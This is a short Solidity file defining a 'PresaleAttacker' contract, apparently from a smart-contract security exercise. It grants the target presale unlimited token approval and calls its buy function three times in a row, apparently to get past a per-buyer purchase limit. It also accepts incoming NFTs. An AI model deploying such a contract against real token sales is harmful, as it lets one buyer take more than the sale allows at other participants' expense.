//SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Presale.sol";
import "./Momo.sol";

contract PresaleAttacker is IERC721Receiver {
    Presale public presale;
    Momo public momo;

    constructor(Presale _presale, Momo _momo) {
        presale = _presale;
        momo = _momo;
        momo.approve(address(presale), type(uint256).max);
    }

    function attack() public {
        presale.buy("aaa");
        presale.buy("aaa");
        presale.buy("aaa");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
